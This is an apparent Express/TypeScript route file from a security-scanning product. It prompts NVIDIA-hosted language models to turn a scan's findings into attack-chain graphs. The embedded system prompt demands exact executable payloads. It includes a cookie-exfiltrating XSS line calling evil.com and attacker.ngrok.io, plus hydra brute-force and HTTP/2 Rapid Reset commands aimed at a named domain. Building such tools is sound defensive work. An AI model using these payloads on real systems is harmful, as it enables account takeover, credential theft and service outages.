import { Router } from "express";
import { EventEmitter } from "events";
import {
  db,
  scansTable as scansTableRaw,
  findingsTable as findingsTableRaw,
  projectsTable as projectsTableRaw,
  attackGraphsTable as attackGraphsTableRaw,
} from "@workspace/db";
const scansTable      = scansTableRaw      as any;
const findingsTable   = findingsTableRaw   as any;
const projectsTable   = projectsTableRaw   as any;
const attackGraphsTable = attackGraphsTableRaw as any;
import { eq, and } from "drizzle-orm";
import { requireAuth } from "../lib/auth.js";
import type { Response } from "express";

const router = Router();

// ── Config ────────────────────────────────────────────────────────────────────
const NIM_BASE   = "https://integrate.api.nvidia.com/v1";
const NIM_MODELS = [
  process.env.NVIDIA_MODEL || "meta/llama-3.1-70b-instruct",
  "meta/llama-3.1-70b-instruct",
  "meta/llama-3.3-70b-instruct",
];
const STALE_MS       = 5 * 60 * 1000;  // 5 minutes
const EMITTER_TTL_MS = 2 * 60 * 1000;  // 2 minutes after done/fail

// ── In-process event bus ──────────────────────────────────────────────────────
const emitters = new Map<string, EventEmitter>();
function getEmitter(scanId: string): EventEmitter {
  if (!emitters.has(scanId)) emitters.set(scanId, new EventEmitter());
  return emitters.get(scanId)!;
}

// ── Helpers ───────────────────────────────────────────────────────────────────
async function resolveAccess(req: any, scanId: string) {
  const workspace = req.workspace;
  const [scan] = await db.select().from(scansTable).where(eq(scansTable.id as any, scanId));
  if (!scan) return null;
  const [project] = await db.select().from(projectsTable).where(
    and(
      eq(projectsTable.id as any, scan.projectId),
      eq(projectsTable.workspaceId as any, workspace.id),
    ),
  );
  if (!project) return null;
  return { scan, project };
}

function isStale(record: any): boolean {
  if (!record || record.status !== "GENERATING") return false;
  return Date.now() - new Date(record.updatedAt).getTime() > STALE_MS;
}

// ── Tech-stack detection from findings ───────────────────────────────────────
function detectTechStack(findings: any[]): string {
  const allText = findings.map(f =>
    `${f.title} ${f.description} ${f.endpoint} ${f.pocCode ?? ""}`,
  ).join(" ").toLowerCase();

  const detections: string[] = [];
  if (allText.includes("wordpress") || allText.includes("wp-admin") || allText.includes("wp-login")) detections.push("WordPress CMS");
  if (allText.includes("nginx"))     detections.push(`nginx (${(allText.match(/nginx\/[\d.]+/) || ["nginx"])[0]})`);
  if (allText.includes("apache"))    detections.push("Apache");
  if (allText.includes("php"))       detections.push("PHP");
  if (allText.includes("laravel"))   detections.push("Laravel");
  if (allText.includes("django"))    detections.push("Django/Python");
  if (allText.includes("rails"))     detections.push("Ruby on Rails");
  if (allText.includes("express") || allText.includes("node")) detections.push("Node.js/Express");
  if (allText.includes("next.js") || allText.includes("nextjs")) detections.push("Next.js SSR");
  if (allText.includes("react") || allText.includes("dangerouslysetinnerhtml")) detections.push("React SPA");
  if (allText.includes("graphql"))   detections.push("GraphQL API");
  if (allText.includes("swagger") || allText.includes("openapi")) detections.push("REST API (OpenAPI)");
  if (allText.includes("jwt") || allText.includes("bearer")) detections.push("JWT Authentication");
  if (allText.includes("cloudflare")) detections.push("Cloudflare WAF/CDN");
  if (allText.includes("aws") || allText.includes("s3") || allText.includes("ec2")) detections.push("AWS Infrastructure");
  if (allText.includes("mongodb"))   detections.push("MongoDB");
  if (allText.includes("mysql") || allText.includes("sql injection")) detections.push("MySQL/SQL Database");
  if (allText.includes("redis"))     detections.push("Redis");
  if (allText.includes("dom xss") || allText.includes("innerhtml")) detections.push("Client-side DOM XSS risk");

  return detections.length > 0 ? detections.join(", ") : "Unknown stack (infer from endpoints and descriptions)";
}

// ── Pre-process findings: triage, group, score ────────────────────────────────
function preprocessFindings(findings: any[]) {
  const severityScore: Record<string, number> = {
    CRITICAL: 10, HIGH: 7, MEDIUM: 4, LOW: 1, INFO: 0,
  };

  // Sort by severity then CVSS
  const sorted = [...findings].sort((a, b) => {
    const scoreDiff = (severityScore[b.severity] ?? 0) - (severityScore[a.severity] ?? 0);
    if (scoreDiff !== 0) return scoreDiff;
    return (parseFloat(b.cvss) || 0) - (parseFloat(a.cvss) || 0);
  });

  // Detect SPA false positives
  const spaSentinels = ["/wp-admin", "/admin", "/config.json", "/.env", "/graphql", "/swagger"];
  const suspectedFPs = sorted.filter(f => {
    const ep = (f.endpoint || "").toLowerCase();
    return spaSentinels.some(s => ep.includes(s)) && (parseFloat(f.cvss) > 5);
  });

  // Group by endpoint base path
  const byEndpoint: Record<string, any[]> = {};
  for (const f of sorted) {
    const base = (f.endpoint || "unknown").replace(/https?:\/\/[^/]+/, "").split("?")[0];
    if (!byEndpoint[base]) byEndpoint[base] = [];
    byEndpoint[base].push(f);
  }

  // Identify chainable pairs (same endpoint = high chain potential)
  const chainablePairs: Array<[any, any]> = [];
  for (const group of Object.values(byEndpoint)) {
    if (group.length >= 2) {
      for (let i = 0; i < group.length - 1; i++) {
        chainablePairs.push([group[i], group[i + 1]]);
      }
    }
  }

  return { sorted, suspectedFPs, byEndpoint, chainablePairs };
}

// ── Format findings for prompt ────────────────────────────────────────────────
function formatFindingsForPrompt(findings: any[]): string {
  return findings.map((f, i) =>
    `Finding #${i + 1}
  ID (UUID — use this exactly): ${f.id}
  Title: ${f.title}
  Severity: ${f.severity} | CVSS: ${f.cvss ?? "N/A"} | CWE: ${f.cwe ?? "N/A"} | OWASP: ${f.owasp ?? "N/A"}
  Endpoint: ${f.endpoint ?? "N/A"}
  Description: ${f.description ?? "N/A"}
  PoC Code: ${f.pocCode ?? "N/A"}`
  ).join("\n\n---\n\n");
}

// ── FORGE-1 System Prompt ─────────────────────────────────────────────────────
function buildSystemPrompt(techStack: string, suspectedFPCount: number): string {
  return `You are FORGE-1 — an elite offensive security AI operating at the level of a 
senior red-team engineer from Google Project Zero or NSA TAO. You think in attack chains, 
not isolated vulnerabilities. Your output arms defenders with the exact playbook an 
attacker would use — technically precise, fully reproducible, zero hand-waving.

DETECTED TECH STACK: ${techStack}
SUSPECTED FALSE POSITIVES IN FEED: ${suspectedFPCount} findings may be scanner artifacts 
(SPA shells, WAF blocks, wrong-scope domains). Do NOT build high-severity chains around 
these unless the description contains actual evidence of real exposure.

═══════════════════════════════════════════════════════
SECTION 1 — FALSE POSITIVE SUPPRESSION (HIGHEST PRIORITY)
═══════════════════════════════════════════════════════

Before building ANY chain, mentally triage each finding:

SPA FALSE POSITIVE PATTERN:
  If the target is a React/Next.js/Vue SPA AND findings include:
  /wp-admin, /admin, /dashboard, /config.json, /.env, /graphql
  with response sizes 100–800 bytes → these are the SPA's index.html
  shell returned for ALL routes. The actual auth enforcement is 
  client-side. DO NOT build high-severity chains from these alone.
  Mark them in your reasoning as "SPA_SHELL_FP" and only include
  them at LOW confidence in Info Gathering steps.

WRONG SCOPE PATTERN:
  SPF/DMARC/CAA findings on the PARENT domain (e.g. ai.in, .com TLD)
  are NOT vulnerabilities of the subdomain target. Skip these entirely
  unless the finding explicitly names the exact target subdomain.

HEADER-ONLY FINDINGS:
  Missing security headers (HSTS, CSP, X-Frame-Options, CORP, COEP,
  COOP, Referrer-Policy, X-Content-Type-Options, Permissions-Policy)
  are NEVER standalone chain starters. They only appear as AMPLIFIERS
  in chains where another real vulnerability already exists.
  Example: "DOM XSS + missing CSP = amplified XSS" is valid.
  "Missing CSP → attacker wins" is NOT a valid chain.

VERSION DISCLOSURE:
  Server version headers (nginx/1.24.0, Apache/2.4.x, PHP/8.x) ARE
  valid recon chain starters. Always cross-reference with known CVEs
  for the exact version. Use ExploitDB/NVD references in your PoC.

═══════════════════════════════════════════════════════
SECTION 2 — CHAIN CONSTRUCTION RULES
═══════════════════════════════════════════════════════

RULE 1 — AUTOMATION FIRST
  Always generate at least one FULLY_AUTOMATED chain (requiresVictim: false).
  Automated chains score +1.0 riskScore bonus over social-engineering variants.
  Priority order:
  1. Direct server exploit (RCE, SQLi, auth bypass) — HIGHEST
  2. Credential attacks (brute-force, stuffing, JWT weakness)
  3. API abuse (IDOR, unauthenticated endpoints, mass assignment)
  4. Recon → targeted CVE exploit pipeline
  5. Social engineering chains — LOWEST (label clearly)

RULE 2 — CHAIN DEPTH (minimum 3 steps, ideal 4–6)
  Every chain must follow this progression:
  RECON → INITIAL ACCESS → EXPLOITATION → LATERAL/ESCALATION → IMPACT
  
  If only 1–2 findings exist, fill chain steps with realistic 
  attacker tradecraft that connects them logically.

RULE 3 — MANDATORY STEP FIELDS
  Every step must have ALL of these populated (NO nulls, NO placeholders):
  
  ✅ findingId     → exact UUID from the findings list, OR null ONLY if 
                     this step is attacker tradecraft not tied to a finding
  ✅ endpoint      → actual URL path (use /api/v1/users, /admin, etc. 
                     based on detected tech stack if not in findings)
  ✅ technique     → MITRE ATT&CK ID + name (T1595.002, T1190, etc.)
  ✅ action        → what the attacker DOES (verb + specific target)
  ✅ payload       → the EXACT string/command/tool the attacker uses.
                     NEVER write "attacker sends malicious input".
                     WRITE the actual input: 
                     ' OR 1=1--
                     <img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>
                     hydra -l admin -P rockyou.txt target.com http-post-form
  ✅ poc           → multi-line shell command, JS snippet, or Burp request
                     showing ACTUAL execution and expected output
  ✅ impact        → what the attacker GAINS (specific data/access/capability)

RULE 4 — DEEP PoC STANDARDS
  REJECT these PoC patterns (rewrite immediately):
  ❌ curl https://target.com/admin          (just an existence check)
  ❌ "attacker reads the .env file"         (no actual technique)
  ❌ grep 'password' response.txt           (not an attack)
  ❌ "use Burp Suite to intercept"          (too vague)
  
  ACCEPT these PoC patterns:
  ✅ Brute-force:
     hydra -l admin -P /usr/share/wordlists/rockyou.txt \\
       -s 443 -S quicklearn.ai.in https-post-form \\
       "/api/auth/login:email=^USER^&password=^PASS^:Invalid credentials"
  
  ✅ DOM XSS exploitation:
     // Visit: https://target.com/#<img src=x onerror=eval(atob('ZmV0Y2goJ2h0dHBzOi8vZXZpbC5jb20vP2M9JytkbN=='))>
     // Payload exfiltrates session cookie to attacker server
     fetch('https://attacker.ngrok.io/steal?c=' + document.cookie + '&dom=' + document.domain)
  
  ✅ Version exploit targeting:
     searchsploit nginx 1.24.0
     # CVE-2023-44487 (HTTP/2 Rapid Reset) applies
     python3 rapid_reset.py --target https://quicklearn.ai.in --threads 100
  
  ✅ IDOR:
     # Authenticated as user ID 1001, access user ID 1002's data:
     curl -H "Authorization: Bearer eyJ..." https://target.com/api/users/1002/profile
     # Expected: 200 OK with victim's PII instead of 403 Forbidden

RULE 5 — CHAIN QUALITY SELF-CHECK
  Before writing each chain to JSON, verify:
  □ Is payload specific (not generic description)?
  □ Is findingId a real UUID from the list (not invented)?
  □ Does the PoC show execution output, not just the command?
  □ Is riskScore calibrated correctly?
     - Fully automated + CVSS 9+ finding = 9.0–10.0
     - Fully automated + CVSS 7–9 = 7.5–9.0
     - Requires victim interaction = subtract 1.5 from automated equivalent
     - Missing-headers-only chains = max 4.0
  □ Are MITRE ATT&CK IDs real and applicable?

═══════════════════════════════════════════════════════
SECTION 3 — CHAIN TYPES TO GENERATE (in priority order)
═══════════════════════════════════════════════════════

Generate exactly 3–4 chains. Priority order:

CHAIN 1 (MUST) — Highest-risk fully automated path
  Use the highest-CVSS confirmed findings. Build a direct attacker 
  pipeline: recon → exploit → impact. No victim required.

CHAIN 2 (MUST) — Tech-stack targeted exploit chain
  Use the detected tech stack (${techStack}). Even if no direct 
  CVE finding exists, include a realistic recon→version→CVE chain 
  showing how stack disclosure enables targeted attacks.

CHAIN 3 (SHOULD) — Credential/Session attack chain
  If auth-related findings exist (XSS, missing HSTS, JWT issues, 
  brute-force surface): build a session hijacking or credential 
  theft chain. Show how an attacker pivots from recon to account takeover.

CHAIN 4 (OPTIONAL) — API abuse or business logic chain
  If API endpoints, GraphQL, or IDOR-style findings exist.

═══════════════════════════════════════════════════════
SECTION 4 — NODE & EDGE RULES
═══════════════════════════════════════════════════════

NODE TYPES AND WHEN TO USE:
  "attacker"     → exactly ONE node, id must be "attacker"
  "vulnerability"→ one per REAL finding (skip suspected FPs as nodes 
                   unless they appear in a chain step)
  "asset"        → servers, databases, APIs the attacker targets
  "target"       → final compromise goal (be SPECIFIC):
                   ✅ "All user session tokens via XSS"
                   ✅ "Admin panel full access"  
                   ✅ "Full database dump"
                   ❌ "System compromised" (too vague)

EDGE RULES:
  - Every edge source AND target MUST exactly match an existing node id
  - Label edges with the attack action: "exploits DOM XSS to steal cookies"
  - chainId must reference a real chain id (c1, c2, etc.)
  - No orphan edges (both endpoints must exist)
  - No duplicate edge IDs

═══════════════════════════════════════════════════════
SECTION 5 — OUTPUT FORMAT (STRICT JSON ONLY)
═══════════════════════════════════════════════════════

Return ONLY a valid JSON object. No text before or after. No markdown 
code fences. No comments. Start with { and end with }.

{
  "summary": "3-sentence executive summary. Sentence 1: overall attack surface. Sentence 2: most dangerous automated chain. Sentence 3: top remediation priority.",
  "chainedRiskLevel": "CRITICAL|HIGH|MEDIUM|LOW",
  "chainedRiskScore": 7.5,
  "attackSurface": "Concise description of what's externally visible: tech stack, auth surface, API exposure, version disclosure",
  "falsePositivesSkipped": ["list of finding titles that were treated as FPs and excluded from high-severity chains"],
  "chains": [
    {
      "id": "c1",
      "title": "Automated: [Specific Technique] → [Specific Impact]",
      "risk": "CRITICAL|HIGH|MEDIUM|LOW",
      "riskScore": 9.1,
      "requiresVictim": false,
      "automationLevel": "FULLY_AUTOMATED|SEMI_AUTOMATED|MANUAL_REQUIRED",
      "mitreIds": ["T1595.002", "T1110.001"],
      "confidence": "HIGH|MEDIUM|LOW",
      "description": "Attacker narrative: specific progression from initial access to impact using the actual target URL and detected tech",
      "steps": [
        {
          "stepNumber": 1,
          "title": "Short action title",
          "findingId": "exact-uuid-or-null-if-tradecraft",
          "endpoint": "/actual/path",
          "technique": "T1595.002 Active Scanning: Vulnerability Scanning",
          "action": "Specific verb + target",
          "payload": "Exact payload string, tool command, or JS code",
          "poc": "Multi-line executable PoC showing exact commands and expected output",
          "impact": "Specific data/access/capability gained at this step",
          "attackerGains": "What the attacker now has that they didn't before"
        }
      ]
    }
  ],
  "nodes": [
    {
      "id": "attacker",
      "type": "attacker",
      "label": "External Attacker",
      "description": "Unauthenticated threat actor with automated tooling"
    },
    {
      "id": "n-FINDING_SHORT_ID",
      "type": "vulnerability",
      "label": "Short finding label",
      "endpoint": "/actual/path",
      "severity": "HIGH",
      "cvss": 7.5,
      "findingId": "exact-uuid",
      "technique": "T1234",
      "isFalsePositive": false
    },
    {
      "id": "target-ASSET_NAME",
      "type": "target",
      "label": "Specific asset compromised",
      "description": "Exactly what the attacker controls after this chain"
    }
  ],
  "edges": [
    {
      "id": "e1",
      "source": "attacker",
      "target": "n-FINDING_SHORT_ID",
      "label": "Specific attack action label",
      "chainId": "c1",
      "animated": true
    }
  ]
}`;
}

// ── User Prompt Builder ───────────────────────────────────────────────────────
function buildUserPrompt(
  project: any,
  scan: any,
  techStack: string,
  findingsText: string,
  suspectedFPs: any[],
  chainablePairs: Array<[any, any]>,
): string {
  const fpHint = suspectedFPs.length > 0
    ? `\nSUSPECTED FALSE POSITIVES (verify before including in high-severity chains):\n${suspectedFPs.map(f => `  - "${f.title}" (${f.endpoint}) — may be SPA shell or WAF block`).join("\n")}`
    : "";

  const chainHint = chainablePairs.length > 0
    ? `\nHIGH CHAIN POTENTIAL (same endpoint, multiple findings):\n${chainablePairs.slice(0, 5).map(([a, b]) => `  - "${a.title}" + "${b.title}" on ${a.endpoint}`).join("\n")}`
    : "";

  return `TARGET: ${project.targetUrl}
TECH STACK (detected): ${techStack}
SCAN SUMMARY: ${scan.criticalCount ?? 0} critical, ${scan.highCount ?? 0} high, ${scan.mediumCount ?? 0} medium, ${scan.lowCount ?? 0} low findings
${fpHint}
${chainHint}

════ FINDINGS (USE EXACT UUIDs — NEVER INVENT IDs) ════
${findingsText}

════ PRE-GENERATION CHECKLIST (complete mentally before writing JSON) ════
For EACH chain step, verify:
□ 1. Payload is specific and executable (not a description)?
□ 2. findingId uses an EXACT UUID from the list above (or null for tradecraft)?
□ 3. PoC shows actual execution output, not just the command?
□ 4. requiresVictim and automationLevel are correctly set?
□ 5. Fully-automated chains score higher than social-engineering variants?
□ 6. No high-severity chain is built solely on suspected false positives?
□ 7. All node IDs referenced in edges actually exist in the nodes array?

Generate the complete attack graph JSON now. Be technically precise. 
Make every chain actionable by a real attacker with standard tooling.`;
}

// ── Post-generation validation & repair ──────────────────────────────────────
function validateAndRepair(parsed: any, findings: any[]): any {
  const validFindingIds = new Set(findings.map(f => f.id));

  // Ensure attacker node
  if (!parsed.nodes?.find((n: any) => n.id === "attacker")) {
    parsed.nodes = parsed.nodes ?? [];
    parsed.nodes.unshift({
      id: "attacker",
      type: "attacker",
      label: "External Attacker",
      description: "Unauthenticated threat actor with automated tooling",
    });
  }

  // Validate findingIds in chain steps
  for (const chain of parsed.chains ?? []) {
    for (const step of chain.steps ?? []) {
      if (step.findingId && !validFindingIds.has(step.findingId)) {
        // Invented UUID — null it out
        step.findingId = null;
        step._fpNote = "findingId was invalid — cleared";
      }
    }
  }

  // Fix edge references
  const nodeIds = new Set((parsed.nodes ?? []).map((n: any) => n.id));
  parsed.edges = (parsed.edges ?? []).filter((e: any) => {
    const valid = nodeIds.has(e.source) && nodeIds.has(e.target);
    return valid;
  });

  // Deduplicate edge IDs
  const seenEdgeIds = new Set<string>();
  parsed.edges = parsed.edges.filter((e: any) => {
    if (seenEdgeIds.has(e.id)) return false;
    seenEdgeIds.add(e.id);
    return true;
  });

  // Sort chains by riskScore descending
  if (Array.isArray(parsed.chains)) {
    parsed.chains.sort((a: any, b: any) => (b.riskScore ?? 0) - (a.riskScore ?? 0));
  }

  // Ensure falsePositivesSkipped exists
  if (!parsed.falsePositivesSkipped) parsed.falsePositivesSkipped = [];

  // Ensure chainedRiskLevel matches top chain
  const topChain = parsed.chains?.[0];
  if (topChain) {
    parsed.chainedRiskLevel = topChain.risk ?? parsed.chainedRiskLevel ?? "HIGH";
    parsed.chainedRiskScore = typeof parsed.chainedRiskScore === "number"
      ? parsed.chainedRiskScore
      : (topChain.riskScore ?? 7.0);
  }

  return parsed;
}

// ── Extract JSON robustly from LLM output ─────────────────────────────────────
function extractJson(text: string): any {
  // Remove markdown fences
  const cleaned = text.replace(/```json\s*/gi, "").replace(/```\s*/g, "").trim();

  // Try full parse first
  try { return JSON.parse(cleaned); } catch {}

  // Find outermost JSON object
  const start = cleaned.indexOf("{");
  const end   = cleaned.lastIndexOf("}");
  if (start === -1 || end === -1) throw new Error("No JSON object found in response");

  const slice = cleaned.slice(start, end + 1);
  try { return JSON.parse(slice); } catch {}

  // Last resort: fix common LLM JSON mistakes
  const repaired = slice
    .replace(/,\s*([}\]])/g, "$1")   // trailing commas
    .replace(/([{,]\s*)(\w+)\s*:/g, '$1"$2":') // unquoted keys
    .replace(/:\s*'([^']*)'/g, ': "$1"');       // single-quoted values

  return JSON.parse(repaired);
}

// ── Routes ────────────────────────────────────────────────────────────────────

router.get("/:scanId", requireAuth, async (req, res) => {
  const scanId = req.params.scanId as string;
  const access = await resolveAccess(req, scanId);
  if (!access) { res.status(404).json({ error: "Not found" }); return; }

  let [graph] = await db.select().from(attackGraphsTable)
    .where(eq(attackGraphsTable.scanId as any, scanId));

  if (graph && isStale(graph)) {
    await db.update(attackGraphsTable)
      .set({ status: "FAILED", errorMessage: "Generation timed out — please retry", updatedAt: new Date() })
      .where(eq(attackGraphsTable.id as any, graph.id));
    graph = { ...graph, status: "FAILED", errorMessage: "Generation timed out — please retry" };
  }

  if (!graph) { res.json({ status: "NOT_GENERATED" }); return; }

  res.json({
    ...graph,
    graph: graph.graphJson ? JSON.parse(graph.graphJson) : null,
  });
});

router.get("/:scanId/stream", requireAuth, async (req, res: Response) => {
  const scanId = req.params.scanId as string;
  const access = await resolveAccess(req, scanId);
  if (!access) { res.status(404).json({ error: "Not found" }); return; }

  res.setHeader("Content-Type", "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection", "keep-alive");
  res.flushHeaders();

  const emit = (event: string, data: unknown) =>
    res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`);

  const emitter = getEmitter(scanId);
  let closed = false;

  const handlers = {
    step:    (d: any) => { if (!closed) emit("step", d); },
    token:   (d: any) => { if (!closed) emit("token", d); },
    done:    (d: any) => { if (!closed) { emit("done", d); res.end(); } },
    fail:    (d: any) => { if (!closed) { emit("fail", d); res.end(); } },
    progress:(d: any) => { if (!closed) emit("progress", d); },
  };

  for (const [event, handler] of Object.entries(handlers)) {
    emitter.on(event, handler);
  }

  req.on("close", () => {
    closed = true;
    for (const [event, handler] of Object.entries(handlers)) {
      emitter.off(event, handler);
    }
  });
});

router.post("/:scanId/reset", requireAuth, async (req, res) => {
  const scanId = req.params.scanId as string;
  const access = await resolveAccess(req, scanId);
  if (!access) { res.status(404).json({ error: "Not found" }); return; }

  await db.delete(attackGraphsTable).where(eq(attackGraphsTable.scanId as any, scanId));
  res.json({ status: "NOT_GENERATED" });
});

router.post("/:scanId/generate", requireAuth, async (req, res) => {
  const scanId = req.params.scanId as string;
  const nimKey = process.env.NVIDIA_NIM_API_KEY;
  if (!nimKey) { res.status(503).json({ error: "AI key not configured" }); return; }

  const access = await resolveAccess(req, scanId);
  if (!access) { res.status(404).json({ error: "Not found" }); return; }
  const { scan, project } = access;

  if (scan.status !== "COMPLETED") {
    res.status(400).json({ error: "Scan must be completed first" }); return;
  }

  const [existing] = await db.select().from(attackGraphsTable)
    .where(eq(attackGraphsTable.scanId as any, scanId));

  if (existing?.status === "GENERATING" && !isStale(existing)) {
    res.json({ status: "GENERATING", message: "Already running" }); return;
  }

  // Upsert
  let graphId: string;
  if (existing) {
    await db.update(attackGraphsTable)
      .set({ status: "GENERATING", errorMessage: null, graphJson: null, updatedAt: new Date() })
      .where(eq(attackGraphsTable.scanId as any, scanId));
    graphId = existing.id;
  } else {
    const [rec] = (await db.insert(attackGraphsTable)
      .values({ scanId, status: "GENERATING" }).returning()) as any[];
    graphId = rec.id;
  }

  res.json({ status: "GENERATING", id: graphId });

  // ── Background generation ──────────────────────────────────────────────────
  const emitter  = getEmitter(scanId);
  const step = (msg: string, num: number) =>
    emitter.emit("step", { step: num, message: msg, ts: Date.now() });
  const progress = (pct: number, msg: string) =>
    emitter.emit("progress", { percent: pct, message: msg });

  (async () => {
    try {
      step("Fetching findings from database…", 1);
      const findings = await db.select().from(findingsTable)
        .where(eq(findingsTable.scanId as any, scanId));

      step(`Pre-processing ${findings.length} findings…`, 2);
      progress(10, "Analyzing finding patterns and attack surface…");

      const { sorted, suspectedFPs, byEndpoint, chainablePairs } = preprocessFindings(findings);
      const techStack    = detectTechStack(findings);
      const findingsText = formatFindingsForPrompt(sorted);

      step(`Tech stack detected: ${techStack.slice(0, 60)}…`, 3);
      progress(20, `Detected: ${techStack.slice(0, 40)} — building targeted chains…`);

      const systemPrompt = buildSystemPrompt(techStack, suspectedFPs.length);
      const userPrompt   = buildUserPrompt(
        project, scan, techStack, findingsText, suspectedFPs, chainablePairs,
      );

      // ── Multi-model generation with retry ──────────────────────────────────
      const uniqueModels = [...new Set(NIM_MODELS)];

      const runGeneration = async (model: string): Promise<any> => {
        step(`Connecting to NVIDIA NIM (${model})…`, 4);
        progress(30, `Sending to ${model}…`);

        const nimResp = await fetch(`${NIM_BASE}/chat/completions`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Authorization": `Bearer ${nimKey}`,
          },
          body: JSON.stringify({
            model,
            max_tokens: 7000,
            stream: true,
            temperature: 0.12,   // Lower = more precise/deterministic
            top_p: 0.85,
            messages: [
              { role: "system", content: systemPrompt },
              { role: "user",   content: userPrompt   },
            ],
          }),
          signal: AbortSignal.timeout(150_000),
        });

        if (!nimResp.ok) {
          const errText = await nimResp.text();
          throw new Error(`NIM API error ${nimResp.status}: ${errText.slice(0, 300)}`);
        }

        step(`FORGE-1 generating attack chains (${model})…`, 5);
        progress(40, "AI is reasoning through attack chains…");

        // Stream tokens
        const reader   = nimResp.body!.getReader();
        const decoder  = new TextDecoder();
        let fullContent = "";
        let buffer      = "";
        let tokenCount  = 0;

        while (true) {
          const { done, value } = await reader.read();
          if (done) break;

          buffer += decoder.decode(value, { stream: true });
          const lines = buffer.split("\n");
          buffer = lines.pop() || "";

          for (const line of lines) {
            if (!line.startsWith("data: ")) continue;
            const data = line.slice(6).trim();
            if (data === "[DONE]") break;
            try {
              const parsed = JSON.parse(data);
              const token  = parsed.choices?.[0]?.delta?.content || "";
              if (token) {
                fullContent += token;
                tokenCount++;
                emitter.emit("token", { token });
                // Progress updates every 200 tokens
                if (tokenCount % 200 === 0) {
                  const pct = Math.min(40 + Math.floor(tokenCount / 50), 85);
                  progress(pct, `Generating chains… (${tokenCount} tokens)`);
                }
              }
            } catch { /* skip malformed SSE lines */ }
          }
        }

        step("Parsing and validating attack graph…", 6);
        progress(88, "Validating graph structure…");

        const raw    = extractJson(fullContent);
        const repaired = validateAndRepair(raw, findings);

        if (!repaired.chains?.length)     throw new Error("No chains generated");
        if (!repaired.nodes?.length)      throw new Error("No nodes generated");
        if (repaired.chains.length < 2)   throw new Error("Too few chains — likely truncated");

        return repaired;
      };

      let parsed: any = null;
      let lastError: Error | null = null;

      for (const model of uniqueModels) {
        try {
          parsed = await runGeneration(model);
          break;
        } catch (err) {
          lastError = err instanceof Error ? err : new Error(String(err));
          step(`Model ${model} failed: ${lastError.message.slice(0, 80)}. Trying next…`, 4);
          progress(30, `Retrying with fallback model…`);
        }
      }

      if (!parsed) throw lastError ?? new Error("All models failed");

      step("Saving attack graph to database…", 7);
      progress(95, "Saving results…");

      await db.update(attackGraphsTable)
        .set({
          status:           "COMPLETE",
          graphJson:         JSON.stringify(parsed),
          chainedRiskLevel:  parsed.chainedRiskLevel,
          chainedRiskScore:  parsed.chainedRiskScore,
          updatedAt:         new Date(),
        })
        .where(eq(attackGraphsTable.id as any, graphId));

      progress(100, "Complete!");
      emitter.emit("done", {
        status:           "COMPLETE",
        chainedRiskLevel:  parsed.chainedRiskLevel,
        chainedRiskScore:  parsed.chainedRiskScore,
        chainsGenerated:   parsed.chains.length,
        falsePositivesSkipped: parsed.falsePositivesSkipped?.length ?? 0,
        graph:             parsed,
      });

    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      await db.update(attackGraphsTable)
        .set({ status: "FAILED", errorMessage: msg, updatedAt: new Date() })
        .where(eq(attackGraphsTable.id as any, graphId));
      emitter.emit("fail", { error: msg });
    } finally {
      // Give SSE clients time to receive done/fail before cleanup
      setTimeout(() => emitters.delete(scanId), EMITTER_TTL_MS);
    }
  })();
});

export default router;